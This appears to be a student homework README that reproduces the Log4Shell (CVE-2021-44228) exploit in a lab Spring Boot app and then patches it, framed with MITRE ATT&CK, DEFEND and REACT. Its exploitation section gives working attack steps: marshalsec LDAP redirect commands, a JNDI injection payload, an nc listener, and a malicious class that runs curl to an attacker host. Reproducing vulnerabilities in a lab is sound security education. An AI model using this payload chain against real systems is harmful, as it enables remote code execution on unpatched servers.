# Week9: Log4Shell Vulnerability Homework

Introduction: This project demonstrates the exploitation and mitigation of the Log4Shell vulnerability (CVE-2021-44228) using a vulnerable Java Spring Boot application deployed via Docker Compose. The objectives of this homework are:

- Simulate a real-world Log4Shell exploit scenario
- Apply MITRE ATT&CK, DEFEND, and REACT frameworks
- Harden and redeploy the application using secure coding practices

---

## Prerequisites
- Docker & Docker Compose
- Java + Maven (if building manually)
- Python 3 (for attacker LDAP simulation)
Also, Ports 8000, 8080, 1389 and 389 are open in your EC2 Security Group (for the app and LDAP server).

---

## Part 1: Exploitation (MITRE ATT&CK)
After launching the ldap app "python3 ldap_server.py"  i received this error: ldap3.core.exceptions.LDAPSocketOpenError: socket connection error while opening: [Errno 111] Connection refused; after researching this error, i came to the point of using marshalsec, which is a malicious LDAP redirect server, not a real LDAP directory; i cloned it (git clone https://github.com/mbechler/marshalsec.git) then built it. I then ran manually these commands 
# HTTP server (for payload)
cd exploit/
python3 -m http.server 8000

# LDAP redirect server
java -cp marshalsec-*.jar marshalsec.jndi.LDAPRefServer http://<your-ip>:8000/#Exploit
To exploit the Log4Shell vulnerability, a vulnerable Spring Boot app using Log4j was set up to log user input. A malicious LDAP server was launched using marshalsec to redirect requests to an HTTP server hosting a malicious Exploit.class. The exploit payload ${jndi:ldap://<attacker-ip>:1389/Exploit} was sent via a POST request to the app’s /log endpoint. When the app logged this input, it triggered the JNDI lookup, causing the app to connect to the LDAP server. This demonstrated remote code loading behavior, confirming the Log4Shell vulnerability's exploitation path from input to remote callback.

Proof of vulnerability exploitation:
![image](https://github.com/user-attachments/assets/892533b0-5fb8-49f6-9acd-80159a2bc812)
nc -lvnp 9999 listener received a connection from the target app's IP (Connection received on 164.52.0.91 51287); The incoming payload shows garbled data and headers (xterm-256color, hostname, etc.), indicating that the curl http://44.208.30.186:9999/ executed successfully inside the vulnerable app. 

To summarize What Just Happened
- the vulnerable Spring Boot app logged: {"input": "${jndi:ldap://44.208.30.186:1389/Exploit}"}
- That triggered a request to your rogue LDAP server (marshalsec).
- The LDAP server instructed the app to load a malicious .class file from your HTTP server.
- The malicious .class file contained: Runtime.getRuntime().exec("curl http://<attacker>:9999/");
- The target executed that, reaching your port 9999, confirming Remote Code Execution (RCE).

the file start_exploit.sh available in the exploit folder automates all this process.

## Part 2: Defense (MITRE DEFEND)
- Log4j upgraded to 2.17.0.
- Input validation implemented to block JNDI patterns.

To do this, we need to:
- Replace vulnerable LogController.java with patched/LogController.java.
- Upgrade log4j version to 2.17.0 in pom.xml.
- Rebuild and restart:

## Part 3: Response (MITRE REACT)
- Detect: Logs examined for exploit traces
- Contain: Vulnerable container stopped
- Eradicate: Patched container deployed
- Recover: System restored with mitigation verified

---

## Conclusion and Lessons Learned

- Logging libraries must be treated as part of the attack surface.
- Validate all input even when passed to internal services.
- MITRE frameworks provide a clear guide for security lifecycle management.

---

## References

- [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)
- [MITRE ATT&CK](https://attack.mitre.org/)
- [MITRE DEFEND](https://defend.mitre.org/)
- [MITRE REACT](https://www.mitre.org/publications/technical-papers/react-a-framework-for-incidence-response)

